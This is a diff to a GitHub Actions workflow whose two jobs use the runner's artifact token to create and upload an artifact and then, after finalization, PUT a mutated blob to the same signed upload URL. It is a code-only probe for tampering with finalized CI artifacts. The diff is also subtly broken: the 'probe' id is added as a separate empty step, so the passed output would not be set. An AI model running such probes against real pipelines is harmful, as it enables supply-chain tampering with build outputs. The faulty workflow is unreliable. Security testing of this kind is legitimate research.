@@ -8,7 +8,10 @@ permissions:
 jobs:
   a-upload-finalize:
     runs-on: ubuntu-latest
+    outputs:
+      upload_url: ${{ steps.probe.outputs.upload_url }}
     steps:
+      - id: probe
       - run: |
           set -eu
           TOKEN="${ACTIONS_RUNTIME_TOKEN#Bearer }"
@@ -24,6 +27,7 @@ jobs:
           curl -sS --max-time 30 "$URL/CreateArtifact" -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" -d @/tmp/create.json > /tmp/create.out
           echo "CREATE_OUT: $(cat /tmp/create.out)"
           jq -r .signedUploadUrl /tmp/create.out > /tmp/upload-url
+          echo "upload_url=$(cat /tmp/upload-url)" >> "$GITHUB_OUTPUT"
           echo "ORIGINAL PAYLOAD" > payload.txt && zip -q blob.zip payload.txt
           SIZE=$(wc -c < blob.zip | tr -d ' ')
           HASH=$(sha256sum blob.zip | cut -d' ' -f1)
@@ -35,7 +39,9 @@ jobs:
     runs-on: ubuntu-latest
     needs: a-upload-finalize
     steps:
-      - run: |
+      - env:
+          UPLOAD_URL: ${{ needs.a-upload-finalize.outputs.upload_url }}
+        run: |
           set -eu
           TOKEN="${ACTIONS_RUNTIME_TOKEN#Bearer }"
           PAYLOAD=$(printf '%s' "$TOKEN" | cut -d. -f2 | tr '_-' '/+')
@@ -47,10 +53,10 @@ jobs:
           echo "MUTATED PAYLOAD" > payload.txt && zip -q blob-b.zip payload.txt
           BHASH=$(sha256sum blob-b.zip | cut -d' ' -f1)
           sleep 3
-          echo "PUT_POST_FINALIZE_CODE=$(curl -sS --max-time 60 -o /dev/null -w '%{http_code}' -D /tmp/put2.hdr -X PUT --upload-file blob-b.zip "$(cat /tmp/upload-url)")"
+          echo "PUT_POST_FINALIZE_CODE=$(curl -sS --max-time 60 -o /dev/null -w '%{http_code}' -D /tmp/put2.hdr -X PUT --upload-file blob-b.zip "$UPLOAD_URL")"
           echo "--- put2 headers ---"; cat /tmp/put2.hdr 2>/dev/null | head -12 || true
           sleep 2
-          echo "PUT_POST_FINALIZE_CODE_RETRY=$(curl -sS --max-time 60 -o /dev/null -w '%{http_code}' -X PUT --upload-file blob-b.zip "$(cat /tmp/upload-url)")"
+          echo "PUT_POST_FINALIZE_CODE_RETRY=$(curl -sS --max-time 60 -o /dev/null -w '%{http_code}' -X PUT --upload-file blob-b.zip "$UPLOAD_URL")"
           echo "MUTATION_SHA=$BHASH"
           printf '%s' '{"workflowRunBackendId":"'"$RUN"'","workflowJobRunBackendId":"'"$JOB"'","name":"probe"}' > /tmp/lookup.json
           curl -sS --max-time 30 "$URL/GetSignedArtifactURL" -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" -d @/tmp/lookup.json > /tmp/lookup.out || true
